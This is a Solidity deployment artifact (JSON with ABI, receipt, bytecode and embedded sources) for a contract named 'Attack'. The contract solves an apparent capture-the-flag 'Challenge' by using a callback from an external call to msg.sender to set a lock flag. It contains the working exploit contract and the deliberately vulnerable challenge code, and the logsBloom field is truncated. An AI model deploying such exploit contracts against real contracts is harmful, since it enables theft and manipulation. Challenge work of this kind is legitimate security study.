{
  "address": "0x381F82d0D52FCB8AE61cdba96a90335341721532",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "challenge_",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "challenge",
      "outputs": [
        {
          "internalType": "contract Challenge",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "me_",
          "type": "address"
        }
      ],
      "name": "hack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0x8faf82dbdd89504bf07783e33e9db88c6be2df588e06f3333ca2ca308b855119",
  "receipt": {
    "to": null,
    "from": "0x6EF1032E74B0371BAa3cA64878d8984eFd1B7453",
    "contractAddress": "0x381F82d0D52FCB8AE61cdba96a90335341721532",
    "transactionIndex": 17,
    "gasUsed": "280994",
    "logsBloom": "0x
    "blockHash": "0x2dedd4ef0e05e21f6f734159b6647f0d427fcedffd31b8faa408eabd257a0581",
    "transactionHash": "0x8faf82dbdd89504bf07783e33e9db88c6be2df588e06f3333ca2ca308b855119",
    "logs": [
      {
        "transactionIndex": 17,
        "blockNumber": 7498599,
        "transactionHash": "0x8faf82dbdd89504bf07783e33e9db88c6be2df588e06f3333ca2ca308b855119",
        "address": "0x381F82d0D52FCB8AE61cdba96a90335341721532",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x0000000000000000000000006ef1032e74b0371baa3ca64878d8984efd1b7453"
        ],
        "data": "0x",
        "logIndex": 24,
        "blockHash": "0x2dedd4ef0e05e21f6f734159b6647f0d427fcedffd31b8faa408eabd257a0581"
      }
    ],
    "blockNumber": 7498599,
    "cumulativeGasUsed": "1873465",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E"
  ],
  "numDeployments": 3,
  "solcInputHash": "87d0edea0a060c0a597ad1b3d585829c",
  "metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"challenge_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"challenge\",\"outputs\":[{\"internalType\":\"contract Challenge\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"me_\",\"type\":\"address\"}],\"name\":\"hack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Attack.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xa94b34880e3c1b0b931662cb1c09e5dfa6662f31cba80e07c5ee71cd135c9673\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"},\"contracts/Attack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport '@openzeppelin/contracts/access/Ownable.sol';\\nimport './Challenge.sol';\\n\\ncontract Attack is Ownable {\\n    Challenge public challenge;\\n\\n    constructor(address challenge_) {\\n        challenge = Challenge(challenge_);\\n    }\\n\\n    fallback() external {\\n        challenge.lock_me();\\n    }\\n\\n    function hack(address me_) external onlyOwner {\\n        challenge.exploit_me(me_);\\n    }\\n}\\n\",\"keccak256\":\"0xeddc0093cbe838e7ec285bd4015ae725fea1e6b4ff25733845398b85630b5ce5\",\"license\":\"MIT\"},\"contracts/Challenge.sol\":{\"content\":\"pragma solidity 0.8.10;\\n\\n// The goal of this challenge is to be able to sign offchain a message\\n// with an address stored in winners.\\ncontract Challenge{\\n\\n    address[] public winners;\\n    bool lock;\\n\\n    function exploit_me(address winner) public{\\n        lock = false;\\n\\n        msg.sender.call(\\\"\\\");\\n\\n        require(lock);\\n        winners.push(winner);\\n    }\\n\\n    function lock_me() public{\\n        lock = true;\\n    }\\n}\",\"keccak256\":\"0x3cb29470fea44644da1139720e3b5cfe094864855d999d8f9d9f3830b36458e5\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b5060405161042538038061042583398101604081905261002f916100ad565b6100383361005d565b600180546001600160a01b0319166001600160a01b03929092169190911790556100dd565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156100bf57600080fd5b81516001600160a01b03811681146100d657600080fd5b9392505050565b610339806100ec6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c80636c4c174f146100c1578063715018a6146100d65780638da5cb5b146100de578063d2ef739814610107578063f2fde38b1461011a575b600160009054906101000a90046001600160a01b03166001600160a01b0316634c228cc76040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100a757600080fd5b505af11580156100bb573d6000803e3d6000fd5b50505050005b6100d46100cf3660046102d3565b61012d565b005b6100d4610197565b6000546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b6001546100eb906001600160a01b031681565b6100d46101283660046102d3565b6101ab565b610135610229565b6001546040516302a4429d60e51b81526001600160a01b0383811660048301529091169063548853a090602401600060405180830381600087803b15801561017c57600080fd5b505af1158015610190573d6000803e3d6000fd5b5050505050565b61019f610229565b6101a96000610283565b565b6101b3610229565b6001600160a01b03811661021d5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084015b60405180910390fd5b61022681610283565b50565b6000546001600160a01b031633146101a95760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610214565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156102e557600080fd5b81356001600160a01b03811681146102fc57600080fd5b939250505056fea2646970667358221220bb597cb82322530572c420a4abd24a0bdea0b03be3bb69609602161593fb3b9064736f6c634300080a0033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100575760003560e01c80636c4c174f146100c1578063715018a6146100d65780638da5cb5b146100de578063d2ef739814610107578063f2fde38b1461011a575b600160009054906101000a90046001600160a01b03166001600160a01b0316634c228cc76040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100a757600080fd5b505af11580156100bb573d6000803e3d6000fd5b50505050005b6100d46100cf3660046102d3565b61012d565b005b6100d4610197565b6000546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b6001546100eb906001600160a01b031681565b6100d46101283660046102d3565b6101ab565b610135610229565b6001546040516302a4429d60e51b81526001600160a01b0383811660048301529091169063548853a090602401600060405180830381600087803b15801561017c57600080fd5b505af1158015610190573d6000803e3d6000fd5b5050505050565b61019f610229565b6101a96000610283565b565b6101b3610229565b6001600160a01b03811661021d5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084015b60405180910390fd5b61022681610283565b50565b6000546001600160a01b031633146101a95760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610214565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156102e557600080fd5b81356001600160a01b03811681146102fc57600080fd5b939250505056fea2646970667358221220bb597cb82322530572c420a4abd24a0bdea0b03be3bb69609602161593fb3b9064736f6c634300080a0033",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 7,
        "contract": "contracts/Attack.sol:Attack",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 143,
        "contract": "contracts/Attack.sol:Attack",
        "label": "challenge",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(Challenge)223"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(Challenge)223": {
        "encoding": "inplace",
        "label": "contract Challenge",
        "numberOfBytes": "20"
      }
    }
  }
}